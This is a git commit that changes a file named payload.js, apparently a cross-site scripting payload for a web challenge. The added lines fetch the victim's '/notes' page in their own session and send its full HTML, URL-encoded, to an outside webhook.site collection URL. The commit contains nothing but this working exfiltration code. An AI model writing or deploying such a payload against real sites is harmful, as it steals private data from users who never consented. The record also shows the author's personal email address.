02742aedaad1764fe84af1d4bc42e39ab4a951d0
Axl <bryannicholas7@gmail.com>
2025-06-20 22:29:15 +0700

    payload

--- payload.js
+++ payload.js
@@ -1,1 +1,4 @@
-location.href = '/notes'
+const response = await fetch('/notes');
+const html = await response.text();
+
+fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?dump=' + encodeURIComponent(html));
